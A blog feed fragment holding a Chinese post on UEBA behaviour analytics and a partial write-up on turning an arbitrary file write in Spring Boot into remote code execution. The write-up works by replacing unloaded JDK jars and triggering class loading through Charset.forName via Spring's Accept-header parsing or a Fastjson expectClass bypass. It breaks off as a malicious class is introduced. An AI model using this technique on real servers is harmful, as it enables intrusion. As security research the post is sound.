title="UEBA原理"></a>UEBA原理</h2><p>UEBA技术不仅检测人的异常行为，也检测实体的异常行为。</p><p>例如，某职员每天的工作时间段是早10点到晚8点，外发的文件数量为几十个，总大小也不超过100MB。但是有一天该职员突然工作到晚上12点，外发文件大小超过100GB，UEBA就会认为这是异常行为，并发出告警信息。如果网络中部署了自动响应与处置类的功能，还可以自动隔离该职员的办公设备，令其无法联网，并锁定该职员的所有账号权限，等待运维人员处理完异常后再重新开放权限。</p><p>相较于人的异常行为，实体的异常行为往往并不容易发现，甚至发现了也会被忽略。例如，某企业的服务器对外提供服务，一般凌晨时段的访问请求非常少，但是某天凌晨的访问请求突然增多，且该服务器开始与网络内的其他服务器进行文件传输，这大概率会触发UEBA的告警。如果没有UEBA，由于传统安全设备主要关注网络边界的安全性，所以该服务器的异常行为并不会触发告警，也不会被拦截，这为企业的网络安全埋下了巨大隐患。</p><p>UEBA利用人工智能和机器学习算法来检测网络中的用户和实体的异常行为。首先，UEBA收集有关用户和实体活动的数据，通过分析数据来<strong>建立用户和实体的行为模式基线</strong>。然后，UEBA会持续监控用户和实体行为，并将其当前行为与基线行为进行比较，<strong>计算风险评分</strong>，确定行为偏差是否可接受。如果风险评分超过一定的阈值，UEBA会实时向用户发出告警。</p><p>风险评分是基于威胁的严重和紧急程度等因素评定的，可以帮助运维人员识别最优先处理的威胁，提高威胁的处置效率。例如，用户多次登录失败，可以生成一个较低的风险评分；而用户向外发送超过10GB的文件，且其中很多文件的名称命中了敏感字，这就应该生成一个较高的风险评分。</p><p>UEBA可以通过多源数据采集和动态基线建模来提升内部威胁检测能力，包括：</p><ol><li>数据来源扩展<ol><li>终端行为数据：包括文件操作记录（创建&#x2F;删除&#x2F;复制敏感文件）、进程执行日志、外设使用记录等，可从EDR或主机审计系统获取。例如异常文件加密或扩展名更改行为可能暗示数据窃取企图。</li><li>网络流量元数据：补充网络层会话数、流量时序特征等参数，结合深度协议分析识别异常通信模式（如非工作时间大量数据外传）等。</li><li>云研发环境日志：现代企业内部研发多采用云研发环境，通过将UEBA系统集成云DEV平台来监测操作日志，实现异常资源访问检测。</li></ol></li><li>基线建模技术增强<ol><li>动态基线更新机制：采用滚动时间窗口（如1-3个月）定期重建基线，通过RPCA（鲁棒主成分分析）和马尔可夫链模型适应行为演化。例如，采用每小时&#x2F;每天作为粒度来划分行为模式。</li><li>多维度关联分析：结合身份权限（低权限账户实现高权限功能操作）、时空上下文（境外&#x2F;异地登录）、设备指纹（新注册终端&#x2F;新终端登录）等生成综合风险评分。</li></ol></li><li>威胁检测场景细化<ol><li>隐蔽数据泄露：监测高频敏感文件压缩、打印机密文档、刻录光盘等物理介质操作。例如，利用打印机扫描文件后发送外部邮箱。</li><li>权限滥用行为：通过SIEM（Security Information and Event Management，安全信息与事件管理）集成检测权限提升后的异常操作链。例如，账户成功登录后立即访问多个无关系统、短时间内批量执行敏感数据查询等。</li></ol></li><li>响应机制优化<ol><li>分级告警策略：根据风险评分触发不同响应，例如，高风险-自动阻断操作并临时冻结账户，中风险-采用二次操作认证，低风险-告警弹窗提示。</li><li>攻击链可视化：通过时间轴图谱展示异常事件关联关系，辅助研判（如异常用户数据操作行为）。</li></ol></li></ol><h2 id="UEBA架构"><a href="#UEBA架构" class="headerlink" title="UEBA架构"></a>UEBA架构</h2><p>从架构上来看，UEBA系统包含三个层次，分别是数据中心层、算法分析层、场景应用层。其中，算法分析层一般运行在实时流处理、近线增量处理、离线批量处理的大数据计算平台之上。下图是一个典型的完整UEBA架构，该平台运行着传统的规则引擎、关联引擎，同时也支持人工智能引擎，如基线及群组分析、异常检测、集成学习风险评分、安全知识图谱、强化学习等UEBA核心技术。</p><p><img src="/2025/06/09/UEBA%E5%9F%BA%E7%A1%80/1749465889177-d62dcdb7-9cff-413e-9b9c-82aa5bc9a037.png"></p><ol><li>基线与群组分析</li></ol><p>通过构建群组分析，可以跨越单个用户、实体的局限，组合基线分析、群组分析，构建全时空的上下文环境来降低误报，提高信噪比。</p><ol start="2"><li>异常检测</li></ol><p>异常检测关注发现统计指标异常、时序异常、序列异常、模式异常等异常信号，采用的技术包括孤立森林、K均值聚类、时序分析、异常检测、变点检测等传统机器学习算法。现代的异常检测也利用深度学习技术，包括基于变分自编码器（VAE）的深度表征重建异常检测、基于循环神经网络（RNN）和长短时记忆网络（LSTM）的序列深度网络异常检测、图神经网络（GNN）的模式异常检测等。针对标记数据缺乏的现状，某些UEBA系统能够采用主动学习技术（Active Learning）、自学习（Self Learning），充分发掘标记数据和无标记数据的价值。</p><ol start="3"><li>风险评分</li></ol><p>风险评分需要综合各种告警、异常，以及进行群组对比分析和历史趋势。同时，风险评分技术中用户间风险的传导同样重要，需要一套类似谷歌搜索使用的网页排名PageRank算法的迭代评估机制。风险评分的好坏，将直接影响到UEBA实施的成效，进而直接影响到安全运营的效率。</p><p><img src="/2025/06/09/UEBA%E5%9F%BA%E7%A1%80/1749465889420-a660a452-69de-4a83-97fc-8ee2f91f6f64.png"></p><ol start="4"><li>安全知识图谱</li></ol><p>可以将从事件、告警、异常、访问中抽取出的实体及实体间关系，构建成一张网络图谱。任何一个事件、告警、异常，都可以集成到网络图谱中，直观、明晰的呈现多层关系，可以让分析抵达更远的边界，触达更隐蔽的联系，揭露出最细微的线索。结合攻击链和知识图谱的关系回放，还能够让安全分析师近似真实的复现攻击全过程，了解攻击的路径与脆弱点，评估潜在的受影响资产，从而更好的进行应急响应与处置。</p><ol start="5"><li>强化学习</li></ol><p>不同目标的环境数据源的多元性及差异性，以及用户对异常风险的定义各有不同，UEBA需要具有一定的自适应性，“入乡随俗”输出更精准的异常风险。强化学习能够根据排查结果自适应地调整正负权重反馈给系统，进而得到更符合目标期望的风险评分。</p><ol start="6"><li>其他技术<ol><li>特征工程：从行为模式中提取合理特征向量极为重要，有些特征在不同业务系统之间通用，有些特征需要根据业务场景具体分析，涉及到如何合理、高效设计指标体系，一般需要参考5W1H模型（又称六何法，或6W分析法，即何人（Who）、何事（What）、何时（When）、何地（Where）、何解（Why）及如何（How）。由这六个疑问词所组成的问句，均不是是非题，而是需要一个或多个事实佐证的应用题）。</li><li>会话重组：会话对象为每个用户从会话启动到终止缝合所有事件，并将这些事件与用户联系起来，即使更改了账户、更改了设备或更改了IP。通过查找启动会话的事件，如Kerberos或NTLM登录、VPN事件、应用程序登录、物理打卡记录等，开启生成会话；登出、打卡离开、超时或其他信号指示会话结束。会话的风险得分是分配给会话中每个活动的风险分数的总和。</li><li>身份识别：在识别同一个用户、实体过程中，并不是所有环境中都有集中认知管理，同一个用户、实体，在不同的系统中的标识、用户名可能不同，需要把这些行为关联到同一个身份标示上，才能让行为画像、异常检测更准确更有效。</li></ol></li></ol><h2 id="UEBA现有技术的区别"><a href="#UEBA现有技术的区别" class="headerlink" title="UEBA现有技术的区别"></a>UEBA现有技术的区别</h2><h3 id="UEBA-vs-UBA"><a href="#UEBA-vs-UBA" class="headerlink" title="UEBA vs UBA"></a>UEBA vs UBA</h3><p>UEBA（用户与实体行为分析）是UBA（用户行为分析）的升级版本，两者的核心差异在于分析维度的扩展和技术深度的提升。UBA专注于用户行为的监测，例如登录、文件操作等，而UEBA在此基础上增加了对实体（如设备、IP、应用程序等）的行为分析，形成更全面的安全防护体系。这种进化源于数字时代网络环境的复杂化，传统的固定办公设备逐渐被移动设备、云主机等多样化接入方式取代，网络边界变得模糊，使得单纯分析用户行为已无法满足安全需求。</p><p>UEBA的优势在于其多维度关联分析能力。例如，当攻击者盗用合法账号进行低频、长期的隐蔽攻击时，UBA可能难以察觉，但UEBA能结合实体行为数据（如异常设备登录、非常规时间的数据访问）识别出偏离基线的行为模式。通过机器学习算法（如无监督学习和聚类分析），UEBA还能动态更新行为基线，适应不断变化的威胁环境。</p><p>实际应用中，UEBA特别擅长检测内部威胁和高级持续性攻击（APT）。例如，某员工突然在非工作时间大量下载敏感文件，或服务器异常外联陌生IP，UEBA会综合用户权限、历史行为及实体状态生成风险评分，触发精准告警。这种能力弥补了传统安全工具（如防火墙、SIEM）对内部威胁的盲区，成为现代企业安全架构的关键组件。</p><h3 id="UEBA-vs-SIEM"><a href="#UEBA-vs-SIEM" class="headerlink" title="UEBA vs SIEM"></a>UEBA vs SIEM</h3><p>SIEM（安全信息与事件管理）和UEBA（用户与实体行为分析）是两种互补的网络安全技术，它们在威胁检测方面各有侧重。SIEM通过集中收集和分析来自网络设备、主机、应用等多元日志数据，提供实时安全事件监控和告警功能，其核心是基于规则匹配来识别已知威胁，例如防火墙拦截记录或异常登录尝试。然而，SIEM对规则库的依赖使其难以应对规则被绕过或长期潜伏的APT攻击等复杂威胁。</p><p>UEBA则从行为分析维度弥补了SIEM的不足。它通过机器学习建立用户和设备的行为基线，持续监测偏离基线的异常活动，例如员工非工作时间大量下载敏感文件或服务器异常外联。这种基于风险评分的动态检测机制，使UEBA能发现内部人员滥用权限、账号盗用等隐蔽威胁，尤其擅长识别低频长期的攻击模式。</p><p>当前技术趋势显示，现代SIEM系统正逐步集成UEBA能力。这种融合方案既能利用SIEM的实时事件关联优势，又能结合UEBA的行为分析深度。这种协同显著提升了企业对内外威胁的立体防御能力，形成从即时告警到长期行为追踪的完整安全闭环。</p><h3 id="UEBA-vs-NTA"><a href="#UEBA-vs-NTA" class="headerlink" title="UEBA vs NTA"></a>UEBA vs NTA</h3><p>NTA（网络流量分析）和UEBA（用户与实体行为分析）是两种互补的网络安全技术，它们在检测范围和数据类型上存在显著差异。NTA专注于分析网络流量中的数据包和流，通过监控全网通信实时识别异常连接或数据传输行为，例如DDoS攻击或异常外联流量。其优势在于无需依赖预定义的日志，可直接从流量层面捕获攻击痕迹，但受限于网络层视角，难以检测终端本地操作（如文件篡改）或长期潜伏的高级威胁。</p><p>UEBA则基于日志数据（如系统日志、身份认证记录）构建用户与设备的行为基线，擅长发现内部人员滥用权限、账号盗用等隐蔽风险。例如，它能识别员工非工作时间批量下载敏感文件等偏离正常模式的行为，而这类威胁往往不会在流量层面显现异常。不过，UEBA需要整合多源异构数据（如HR系统、访问控制日志），部署复杂度高于NTA。</p><p>实际应用中，两者常协同工作：NTA提供网络层威胁线索，UEBA补充用户行为上下文，共同构建从网络到终端的立体防护体系。例如，当NTA发现异常数据外传时，UEBA可关联分析发起该流量的用户是否具有合法权限，从而提升检测准确性。</p>]]></content>
      
      
      <categories>
          
          <category> 数据安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据安全 </tag>
            
            <tag> UEBA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot任意文件写场景下的RCE</title>
      <link href="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/"/>
      <url>/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很早之前就看到过LandGrey师傅写的文章<a href="https://landgrey.me/blog/22/">Spring Boot FatJar写文件漏洞到稳定RCE的探索</a>，凑巧在暑期实习面试的时候面试官也问到了相关问题，<strong>如何对一个存在Fastjson任意文件写漏洞的SpringBoot项目来实现RCE？</strong>常规的一些方式可能是通过写计划任务、替换so&#x2F;dll等系统文件进行劫持等来实现RCE，但是实际情况下往往受限于权限、网络等问题，因此从Java代码层面来寻找一种RCE的方式更为贴切。</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="FatJar"><a href="#FatJar" class="headerlink" title="FatJar"></a>FatJar</h3><p>FatJar通常也称为uber-JAR，是一种Java归档文件，它不仅包括应用程序的编译源代码，还包括运行应用程序所需的所有依赖项和资源。这些依赖项可能包括库、框架，甚至是嵌入式服务器，如Tomcat或Jetty，这些通常在SpringBoot应用中使用。</p><p>换句话说，FatJar是一个独立可直接运行的软件包。与普通JAR文件不同的是，普通JAR文件在运行应用程序时可能需要在classpath中存在外部依赖，而FatJAR文件则完全自给自足，可以在任何已安装Java虚拟机的系统上运行，无需安装或设置任何额外的依赖。</p><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>类从被加载到 JVM 开始，到卸载出内存，整个生命周期分为七个阶段，分别是加载、验证、准备、解析、初始化、使用和卸载。其中，验证、准备和解析这三个阶段统称为连接。系统加载Class类型的文件主要三步，加载-&gt;连接-&gt;初始化；连接过程又可分为三步，验证-&gt;准备-&gt;解析。</p><p>类加载器是一个负责加载类的对象，主要作用就是动态加载Java类的字节码（.class文件）到JVM中（在内存中生成一个代表该类的Class对象）。其中，字节码可以是Java源程序（.java文件）经过javac编译得来，也可以是通过工具动态生成或者通过网络下载得来。</p><p><strong>类装载 (Class loading) 和类初始化 (Class initialization) 通常并称为类加载。</strong></p><p>类装载是由JVM的不同ClassLoader，包括Bootstrap Classloder、Extention ClassLoader、App ClassLoader和用户自定义的Classloder完成。类装载通常是一个Class在字节码中引用另一个Class时被动触发的，也有通过Classloder#loadClass和Class#forName等方式主动触发的。</p><p>利用命令”java -XX:+TraceClassLoading xxx.jar”可以观察到类装载的过程如下，其中，Opened操作代表打开指定文件，通常表示第一次读取相关字节码到内存；Loaded操作代表将读取的指定类的字节码进行装载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Opened /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.lang.Object from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.io.Serializable from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.lang.Comparable from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.lang.CharSequence from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">[Loaded java.lang.String from /Library/Java/JavaVirtualMachines/jdk1.8.0_65.jdk/Contents/Home/jre/lib/rt.jar]</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>类初始化阶段是类加载过程的最后一个阶段，它主要执行类的初始化代码，包括静态变量赋值和静态代码块的执行。以下是类初始化的具体过程：</p><ol><li>创建类的实例：通过new关键字、反射（Class.forName）、克隆（clone）或反序列化（ObjectInputStream.readObject）等方式创建类的实例时，会触发类初始化；</li><li>调用类的静态方法：当调用类的静态方法时，会触发类初始化；</li><li>访问类的静态字段：当访问类的静态字段时，会触发类初始化，但通过子类引用父类的静态字段，不会触发子类的初始化；</li><li>反射调用：通过反射方式访问类时，如Class.forName，会触发类初始化；</li><li>初始化子类：当初始化一个类时，如果其父类还没有初始化，会先触发父类的初始化；</li><li>虚拟机启动时：虚拟机启动时，会初始化指定的主类。</li></ol><h3 id="类加载器的加载流程"><a href="#类加载器的加载流程" class="headerlink" title="类加载器的加载流程"></a>类加载器的加载流程</h3><ol><li>首先，ClassLoader会调用loadClass方法加载类；</li><li>loadClass方法先调用findLoadedClass方法检查类是否已经初始化，如果JVM已初始化过该类则直接返回类对象；</li><li>如果创建当前ClassLoader时传入了父类加载器，就使用父类加载器加载类，否则使用Bootstrap ClassLoader进行加载；</li><li>如果上一步无法加载类，那么调用自身的findClass方法尝试加载类；</li><li>如果当前的ClassLoader没有重写了findClass方法，那么直接返回类加载失败异常；如果当前类重写了findClass方法并通过传入的类名找到了对应的类字节码，那么调用defineClass方法去JVM中注册该类；</li><li>如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类，默认为false；</li><li>最后，返回一个被JVM加载后的java.lang.Class类对象。</li></ol><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743571872121-887501c8-cfe5-4bec-9fc3-328c29c9f5db.png"></p><h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>由于App ClassLoader只负责加载classpath下的类库，因此当App ClassLoader遇到没有加载的系统类库时，会将系统类库的加载工作交给Bootstrap ClassLoader和Extension ClassLoader，这就是双亲委派。</p><p>在下图中，App ClassLoader在加载一个未知的类名时，并不是立即去搜寻classpath，它会首先将这个类名称交给Extension ClassLoader来加载，如果Extension ClassLoader可以加载，那么App ClassLoader就不会进行加载，否则的话App ClassLoader会搜索classpath。Extension ClassLoader在加载一个未知的类名时，也并不是立即搜寻ext路径，它会首先将类名称交给Bootstrap ClassLoader来加载，如果Bootstrap ClassLoader可以加载，Extension ClassLoader也不会对其进行加载，否则的话才会搜索ext路径下的jar包。</p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1708347066695-144e68ff-e4cd-40c8-8e60-b62acc0e3a25.png"></p><p>App ClassLoader、Extension ClassLoader、Bootstrap ClassLoader三者之间形成了一个级联的父子关系，优先把任务交给其父亲，当其父亲无法完成任务时才会轮到自己，在每个ClassLoader对象的内部都会存在一个parent属性指向自己的父加载器。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上文提到了，在类初始化阶段时会执行static代码块、static属性引用的方法等，还可能执行构造器中的代码。在类装载的过程中可以看到应用程序在首次启动时会装载很多类，同时，在应用程序运行过程中，会因为部分代码首次执行或首次异常报错而触发一些类的装载和初始化，</p><p>如果能够找到一种方法，控制应用程序在指定的文件写漏洞可控的文件范围内，主动触发初始化恶意的类，那么就有可能将写文件漏洞转变为代码执行漏洞。</p><p>对于SpringBoot来说，FatJar会把所有资源打包进一个Jar文件内，因此无法再应用程序运行时往classpath等目录内写入文件，这也导致无法通过写Webshell、替换模版资源文件以及替换class文件等方式来实现RCE。</p><p>既然无法将文件写入应用程序的classpath目录中，那能否可以将文件写入更为底层的系统classpath目录（JDK HOME目录）中呢？</p><p>在Java程序运行时，JVM会通过类加载器来完成类的加载，将类文件加载到内存中。<strong>但JVM存在”懒加载”特性，懒加载机制的一个主要特征是相关.jar文件的Opened操作不会在程序一开始运行时就发生。</strong>换句话说，JVM不会在程序启动时就打开所有.jar文件来加载其中的类，只有当程序代码中真正调用到某个类时（例如通过new关键字创建对象、调用类的静态方法或访问类的静态字段等操作），JVM才会去打开包含该类的.jar文件，并加载该类到内存中。例如，如果程序中有一个java.util.ArrayList类的实例化操作，那么JVM会在执行到这行代码时，才去打开包含ArrayList类的.jar文件（通常是rt.jar或java.base模块中的某个.jar文件），并加载ArrayList类。</p><p>结合这个特性，可以通过增加或替换JDK HOME目录下的系统jar文件并主动触发jar文件里的类初始化操作来实现RCE的目的。需要注意的是，JDK在启动后，不会主动寻找JDK HOME目录下新增的jar文件去尝试加载，<strong>因此只能替换JDK HOME目录下原有的系统jar文件，并且还必须是系统启动后没有进行过Opened操作的系统jar文件。</strong></p><p>除此以外，由于JDK HOME的目录路径一般是不固定的，可以通过枚举目录的方式来写入文件。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="Charset"><a href="#Charset" class="headerlink" title="Charset"></a>Charset</h3><h4 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h4><p>在spring-web组件的org.springframework.web.accept.HeaderContentNegotiationStrategy类中，对于每一次请求，Spring框架都会尝试解析Accept头的值，并设置相应的字符集编码。</p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583367936-ee5eb7a9-e738-4691-ab96-9eaee3ca76b6.png"></p><p>先跟进org.springframework.http.MediaType#parseMediaTypes方法，并再跟进几次调用到</p><p>spring-core组件org.springframework.util.MimeTypeUtils#parseMimeTypeInternal方法中，对获取到的Accept头进行解析，最终实例化一个MimeType对象。</p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583700471-930fcdde-623c-4a55-9f77-9cbcb55af050.png"></p><p>跟进对应有参构造函数，利用checkParameters方法对parameters进行解析，接着调用Charset#forName方法来主动加载字符集的代码。</p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743584000938-e11ba513-b58a-4510-b419-9382cf4d119d.png"></p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743583968645-83dee083-c9b8-48ff-9a98-d78d3bb680e4.png"></p><p>最后，结合上文分析的Spring框架解析Accept请求头来实现RCE目的。</p><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585478461-cb459358-8ff1-4fb4-a72c-55786b7a8dcd.png"></p><h4 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h4><p>在com.alibaba.fastjson.parser.ParserConfig类中有如下处理代码，而实际的findClass方法会枚举buckets中保存的IdentityHashMap&lt;Type, ObjectDeserializer&gt;类型键值对，java.nio.charset.Charset类名正好在白名单中，所以可以直接返回clazz。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class <span class="title function_">findClass</span><span class="params">(String keyString)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; buckets.length; i++) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">bucket</span> <span class="operator">=</span> buckets[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bucket == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K, V&gt; entry = bucket; entry != <span class="literal">null</span>; entry = entry.next) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> bucket.key;</span><br><span class="line">            <span class="keyword">if</span> (key <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ((Class) key);</span><br><span class="line">                <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">                <span class="keyword">if</span> (className.equals(keyString)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在com.alibaba.fastjson.serializer.MiscCodec#deserialze方法中有以下处理代码，当clazz类型为java.nio.charset.Charset时，调用Charset#forName方法，最终调用到jre&#x2F;lib&#x2F;rt.jar!&#x2F;sun&#x2F;nio&#x2F;cs&#x2F;AbstractCharsetProvider.class中，其中this.packagePrefix值为sun.nio.cs.ext，即charsets.jar的包名前缀，并且参数可控，直接加载可控类即可触发RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Charset.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) Charset.forName(strVal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Charset <span class="title function_">lookup</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> (String)<span class="built_in">this</span>.classMap.get(var1);</span><br><span class="line">    <span class="keyword">if</span> (var9 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> Class.forName(<span class="built_in">this</span>.packagePrefix + <span class="string">&quot;.&quot;</span> + var9, <span class="literal">true</span>, <span class="built_in">this</span>.getClass().getClassLoader());</span><br><span class="line">            <span class="type">Charset</span> <span class="variable">var5</span> <span class="operator">=</span> (Charset)var4.newInstance();</span><br><span class="line">            <span class="built_in">this</span>.cache.put(var1, <span class="keyword">new</span> <span class="title class_">SoftReference</span>(var5));</span><br><span class="line">            <span class="keyword">return</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var6) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var7) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException var8) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585621559-0f4ccf49-3f8c-491d-93e7-e89959fc776f.png"></p><h4 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h4><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743585845250-aae272b6-5f58-4dd1-aa4a-99d6ed99afab.png"></p><h4 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h4><p><img src="/2025/04/02/SpringBoot%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84RCE/1743587583962-fc3c0b50-38b8-4636-acd9-b4c70e8827f7.png"></p><h3 id="jre-classes"><a href="#jre-classes" class="headerlink" title="jre&#x2F;classes"></a><font style="color:rgb(36, 41, 47);">jre&#x2F;classes</font></h3><p>除了覆盖JDK8下的Bootstrap和Ext ClassLoader下的jar文件，还可以通过在&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;jdkversion&#x2F;Contents&#x2F;Home&#x2F;jre&#x2F;classes目录（不存在就创建一个）下写入恶意class文件，通过Fastjson的expectClass绕过方式触发其加载。</p><p>例如，对于Fastjson 1.2.68可以编写一个实现了java.lang.AutoCloseable的恶意类，在其静态代码块中插入命令执行代码，绕过检查直接触发恶意类的加载，实现RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hacker</span> <span class="keyword">implements</span> <span class="title 